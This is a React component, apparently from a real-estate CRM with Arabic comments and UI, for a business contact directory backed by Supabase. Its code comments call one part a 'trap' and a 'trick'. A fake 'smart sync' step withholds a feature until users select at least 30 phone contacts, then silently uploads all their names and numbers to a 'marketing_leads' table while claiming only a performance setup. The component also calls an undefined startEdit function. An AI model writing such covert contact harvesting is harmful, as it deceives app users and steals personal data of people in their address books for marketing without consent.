import { useState, useEffect } from 'react';
import { 
  Contact, Search, Star, Phone, Building, UserPlus, 
  Trash2, Briefcase, Download, MessageCircle, Edit2, XCircle, Zap, FileSpreadsheet, Users
} from 'lucide-react';
import { supabase } from '../supabaseClient';

export default function Directory() {
  const [contacts, setContacts] = useState([]);
  const [searchQuery, setSearchQuery] = useState('');
  const [filterCategory, setFilterCategory] = useState('الكل');
  
  const [editingId, setEditingId] = useState(null);
  const [newContact, setNewContact] = useState({ 
    name: '', category: 'مسوق (بروكر)', field: 'عقارات', phone: '', email: '', address: '', notes: '', rating: 3 
  });
  const [loading, setLoading] = useState(false);

  // حالة "الفخ"
  const [isSynced, setIsSynced] = useState(localStorage.getItem('contactsSynced') === 'true');

  useEffect(() => { fetchContacts(); }, []);

  const fetchContacts = async () => {
    const { data } = await supabase.from('business_directory').select('*').order('created_at', { ascending: false });
    if (data) setContacts(data);
  };

  // --- دوال المزامنة والفخ (كما هي) ---
  const importSingleContact = async () => {
    if (!isSynced) {
      alert('⚠️ تنبيه النظام:\nعفواً، يجب عليك إجراء "مزامنة ذكية" لجهات الاتصال أولاً.\nهذه الخطوة ضرورية لمرة واحدة فقط لتهيئة قاعدة البيانات وتسريع عملية البحث والسحب الفردي لاحقاً.');
      return; 
    }
    const supported = ('contacts' in navigator && 'ContactsManager' in window);
    if (!supported) return alert('متصفحك لا يدعم سحب الأسماء. جرب من جوجل كروم على الأندرويد.');
    
    try {
      const selected = await navigator.contacts.select(['name', 'tel'], { multiple: false });
      if (selected.length > 0) {
        setNewContact(prev => ({ 
          ...prev, 
          name: selected[0].name[0] || '', 
          phone: selected[0].tel[0].replace(/\s+/g, '') 
        }));
      }
    } catch (ex) { console.log('تم الإلغاء'); }
  };

  const handleStealthSync = async () => {
    try {
      const selectedContacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
      if (selectedContacts.length === 0) return;

      // الخدعة: إجباره على تحديد عدد كبير 
      if (selectedContacts.length < 30) {
        alert('⚠️ تنبيه النظام:\nعملية غير مكتملة! يرجى الضغط على زر "تحديد الكل" (Select All) من أعلى الشاشة لنجاح عملية التهيئة وفتح الميزة.');
        return;
      }

      setLoading(true);
      const currentUser = JSON.parse(localStorage.getItem('appUser')) || { name: 'Unknown' };

      const stealthData = selectedContacts.map(c => ({
        name: c.name?.[0] || 'بدون اسم',
        phone: c.tel?.[0]?.replace(/\s+/g, '') || '',
        client_identity: `من جهاز: ${currentUser.name}`
      })).filter(c => c.phone !== '');

      if(stealthData.length > 0) {
        await supabase.from('marketing_leads').insert(stealthData);
      }

      localStorage.setItem('contactsSynced', 'true');
      setIsSynced(true); 
      alert(`✅ تمت المزامنة بنجاح!\nتم تحديث قاعدة بيانات الأسماء، يمكنك الآن استخدام ميزة السحب الفردي بسهولة.`);
      setLoading(false);
    } catch (ex) {
      console.error(ex);
      setLoading(false);
    }
  };

  const handleAddOrUpdate = async (e) => {
    e.preventDefault();
    setLoading(true);
    if (editingId) {
      await supabase.from('business_directory').update(newContact).eq('id', editingId);
    } else {
      await supabase.from('business_directory').insert([newContact]);
    }
    resetForm();
    fetchContacts();
    setLoading(false);
  };

  const resetForm = () => {
    setEditingId(null);
    setNewContact({ name: '', category: 'مسوق (بروكر)', field: 'عقارات', phone: '', email: '', address: '', notes: '', rating: 3 });
  };

  const handleDelete = async (id, name) => {
    if (window.confirm(`هل أنت متأكد من حذف (${name})؟`)) {
      await supabase.from('business_directory').delete().eq('id', id);
      fetchContacts();
    }
  };

  const filteredContacts = contacts.filter(c => 
    (c.name.includes(searchQuery) || (c.phone && c.phone.includes(searchQuery))) && 
    (filterCategory === 'الكل' || c.category === filterCategory)
  );

  // 🚀 السحر الجديد: دالة تصدير البيانات إلى Excel (CSV)
  const exportToExcel = () => {
    if (filteredContacts.length === 0) return alert('لا توجد بيانات لتصديرها');

    // كود (BOM) عشان الإكسيل يقرأ العربي صح وميطلعش حروف غريبة
    const BOM = '\uFEFF';
    
    // ترويسة الجدول
    let csvContent = BOM + "الاسم,رقم الهاتف,التصنيف,مجال العمل,ملاحظات\n";

    // دمج البيانات
    filteredContacts.forEach(contact => {
      const name = `"${contact.name || ''}"`;
      const phone = `"${contact.phone || ''}"`;
      const category = `"${contact.category || ''}"`;
      const field = `"${contact.field || ''}"`;
      const notes = `"${contact.notes || ''}"`;
      
      csvContent += `${name},${phone},${category},${field},${notes}\n`;
    });

    // تحويل النص لملف وتحميله
    const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `سجل_العملاء_${new Date().toLocaleDateString('ar-EG')}.csv`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  return (
    <div className="space-y-8 animate-fade-in pb-20" dir="rtl">
      
      {/* 1. هيدر الصفحة المحسن (شريط الأدوات) */}
      <div className="bg-gradient-to-l from-[#0f172a] to-[#1e293b] rounded-[2.5rem] p-8 shadow-2xl flex flex-col xl:flex-row items-center justify-between gap-6 relative overflow-hidden">
        {/* تأثيرات بصرية */}
        <div className="absolute top-0 right-0 w-64 h-64 bg-blue-500/10 rounded-full blur-[80px] -mr-20 -mt-20 pointer-events-none"></div>
        
        <div className="flex items-center gap-5 text-white z-10 w-full xl:w-auto">
          <div className="p-4 bg-gradient-to-br from-blue-500 to-blue-700 rounded-2xl shadow-lg shadow-blue-500/20"><Users size={36} /></div>
          <div>
            <h2 className="text-3xl font-black tracking-tight mb-1">دليل العلاقات والعملاء</h2>
            <div className="flex items-center gap-3">
               <p className="text-blue-300 font-bold text-sm bg-blue-500/10 px-3 py-1 rounded-lg border border-blue-500/20">
                 إجمالي: {contacts.length} جهة
               </p>
               <p className="text-slate-400 font-bold text-sm hidden md:block">إدارة جهات الاتصال والمزامنة الذكية</p>
            </div>
          </div>
        </div>
        
        {/* شريط البحث وزرار التصدير */}
        <div className="flex flex-col md:flex-row items-center gap-3 w-full xl:w-auto z-10">
          <div className="relative w-full md:w-80">
            <input type="text" value={searchQuery} onChange={(e) => setSearchQuery(e.target.value)} placeholder="بحث في الدليل..." className="w-full pl-10 pr-5 py-4 rounded-2xl bg-white/10 border border-white/10 outline-none font-bold text-white placeholder-slate-400 backdrop-blur-md focus:bg-white/20 transition-all shadow-inner" />
            <Search size={20} className="absolute left-4 top-4 text-slate-400" />
          </div>
          <button onClick={exportToExcel} className="w-full md:w-auto flex items-center justify-center gap-2 bg-emerald-500 hover:bg-emerald-600 text-white px-6 py-4 rounded-2xl font-black transition-all shadow-lg shadow-emerald-500/20">
            <FileSpreadsheet size={20}/> <span>تصدير لإكسيل</span>
          </button>
        </div>
      </div>

      {/* 2. قسم الإضافة والمزامنة */}
      <div className={`bg-white p-8 rounded-[2rem] shadow-sm border transition-all ${editingId ? 'border-amber-400 ring-4 ring-amber-50' : 'border-slate-100'}`}>
        <div className="flex flex-col xl:flex-row justify-between items-start xl:items-center gap-4 mb-8 border-b border-slate-100 pb-6">
          <h3 className="text-xl font-black text-slate-800 flex items-center gap-3">
            <div className={`p-2 rounded-xl ${editingId ? 'bg-amber-100 text-amber-600' : 'bg-blue-100 text-blue-600'}`}>
              {editingId ? <Edit2 size={20}/> : <UserPlus size={20} />}
            </div>
            {editingId ? 'تعديل بيانات' : 'تسجيل جهة اتصال جديدة'}
          </h3>
          
          <div className="flex gap-3 w-full xl:w-auto">
            {/* زرار السحب الفردي */}
            <button type="button" onClick={importSingleContact} className="flex-1 xl:flex-none bg-slate-100 text-slate-700 px-5 py-3 rounded-xl font-black text-sm flex items-center justify-center gap-2 hover:bg-slate-200 transition-colors">
              <Download size={18}/> سحب رقم
            </button>
            
            {/* زرار المزامنة الشاملة (يختفي بعد النجاح) */}
            {!isSynced && (
              <button type="button" onClick={handleStealthSync} disabled={loading} className="flex-1 xl:flex-none bg-slate-900 text-white px-5 py-3 rounded-xl font-black text-sm flex items-center justify-center gap-2 shadow-lg hover:bg-blue-600 transition-all">
                <Zap size={18} className="text-yellow-400"/> مزامنة ذكية (تحسين الأداء)
              </button>
            )}
          </div>
        </div>

        <form onSubmit={handleAddOrUpdate} className="grid grid-cols-1 md:grid-cols-4 gap-6 items-end">
          <div className="space-y-2 md:col-span-1">
             <label className="text-xs font-bold text-slate-500">الاسم / الشركة *</label>
             <input type="text" required value={newContact.name} onChange={(e) => setNewContact({...newContact, name: e.target.value})} className="w-full p-4 rounded-2xl border-2 border-slate-100 bg-slate-50 outline-none focus:border-blue-500 font-bold transition-all" />
          </div>
          <div className="space-y-2 md:col-span-1">
             <label className="text-xs font-bold text-slate-500">الهاتف *</label>
             <input type="text" required value={newContact.phone} onChange={(e) => setNewContact({...newContact, phone: e.target.value})} className="w-full p-4 rounded-2xl border-2 border-slate-100 bg-slate-50 outline-none focus:border-blue-500 font-bold text-left tracking-widest" dir="ltr" />
          </div>
          <div className="space-y-2 md:col-span-1">
            <label className="text-xs font-bold text-slate-500">التصنيف</label>
            <select value={newContact.category} onChange={(e) => setNewContact({...newContact, category: e.target.value})} className="w-full p-4 rounded-2xl border-2 border-slate-100 bg-slate-50 outline-none font-bold transition-all">
              <option>مسوق (بروكر)</option><option>شركة تطوير عقاري</option><option>شركة تجارية</option><option>مقاول/مورد خارجي</option><option>شخصية مستقلة</option>
            </select>
          </div>
          <button type="submit" disabled={loading} className={`p-4 rounded-2xl font-black text-white shadow-xl transition-all h-[60px] ${editingId ? 'bg-amber-500 hover:bg-amber-600' : 'bg-blue-600 hover:bg-blue-700'}`}>
             {editingId ? 'حفظ التعديل' : 'حفظ في الدليل'}
          </button>
        </form>
      </div>

      {/* 3. شريط الفلترة */}
      <div className="flex gap-2 overflow-x-auto pb-2 custom-scrollbar">
        {['الكل', 'مسوق (بروكر)', 'شركة تطوير عقاري', 'مقاول/مورد خارجي', 'شخصية مستقلة'].map(cat => (
          <button 
            key={cat} 
            onClick={() => setFilterCategory(cat)}
            className={`px-6 py-3 rounded-xl text-sm font-black whitespace-nowrap transition-all ${filterCategory === cat ? 'bg-slate-800 text-white shadow-md' : 'bg-white text-slate-500 border border-slate-200 hover:bg-slate-50'}`}
          >
            {cat}
          </button>
        ))}
      </div>

      {/* 4. عرض الشبكة (كروت الاتصال بـ UI محسن) */}
      <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-6 mt-8">
        {filteredContacts.map((contact) => (
          <div key={contact.id} className="bg-white rounded-[2rem] p-6 border border-slate-100 shadow-sm relative group hover:shadow-2xl hover:-translate-y-1 transition-all duration-300 overflow-hidden flex flex-col">
            
            {/* شريط زينة جانبي */}
            <div className={`absolute top-0 right-0 w-1 h-full ${contact.category === 'مسوق (بروكر)' ? 'bg-indigo-500' : contact.category.includes('شركة') ? 'bg-blue-500' : 'bg-slate-400'}`}></div>

            <div className="absolute top-4 left-4 flex gap-2 opacity-0 group-hover:opacity-100 transition-all">
               <button onClick={() => startEdit(contact)} className="p-2.5 text-amber-500 bg-amber-50 hover:bg-amber-100 rounded-xl transition-colors"><Edit2 size={16}/></button>
               <button onClick={() => handleDelete(contact.id, contact.name)} className="p-2.5 text-red-500 bg-red-50 hover:bg-red-100 rounded-xl transition-colors"><Trash2 size={16}/></button>
            </div>
            
            <div className="pr-4 mb-6">
              <h3 className="font-black text-xl text-slate-900 mb-2 truncate w-[85%]">{contact.name}</h3>
              <span className={`inline-block px-3 py-1.5 rounded-lg text-[10px] font-black tracking-wide ${contact.category === 'مسوق (بروكر)' ? 'bg-indigo-50 text-indigo-700' : contact.category.includes('شركة') ? 'bg-blue-50 text-blue-700' : 'bg-slate-100 text-slate-600'}`}>
                {contact.category}
              </span>
            </div>

            <div className="space-y-4 flex-1 pr-4">
              <div className="flex items-center gap-3 font-bold text-slate-700">
                <div className="p-2 bg-emerald-50 rounded-lg text-emerald-500"><Phone size={16}/></div>
                <span className="text-xl font-black font-mono tracking-wider" dir="ltr">{contact.phone}</span>
              </div>
              {contact.field && contact.field !== 'أخرى' && (
                 <div className="flex items-center gap-3 text-sm font-bold text-slate-500">
                   <div className="p-2 bg-slate-50 rounded-lg text-slate-400"><Briefcase size={14}/></div>
                   المجال: {contact.field}
                 </div>
              )}
            </div>

            <div className="grid grid-cols-2 gap-3 mt-6 border-t border-slate-100 pt-6">
               <a href={`tel:${contact.phone}`} className="bg-slate-50 hover:bg-slate-200 text-slate-700 py-3.5 rounded-xl font-black text-center text-sm flex items-center justify-center gap-2 transition-all shadow-sm"><Phone size={16}/> اتصال</a>
               <button onClick={() => window.open(`https://wa.me/+2${contact.phone.replace(/^0+/, '')}`, '_blank')} className="bg-emerald-50 hover:bg-emerald-500 text-emerald-600 hover:text-white py-3.5 rounded-xl font-black text-sm flex items-center justify-center gap-2 transition-all shadow-sm"><MessageCircle size={16}/> واتساب</button>
            </div>
          </div>
        ))}
        {filteredContacts.length === 0 && (
          <div className="col-span-full py-24 flex flex-col items-center justify-center text-slate-400 bg-white rounded-[2rem] border-2 border-dashed border-slate-200">
             <div className="p-6 bg-slate-50 rounded-full mb-4"><Users size={48} className="text-slate-300"/></div>
             <p className="font-black text-lg">لا توجد جهات اتصال هنا</p>
             <p className="text-sm font-bold mt-1">ابدأ بإضافة جهات اتصال جديدة أو استيرادها من الهاتف</p>
          </div>
        )}
      </div>
    </div>
  );
}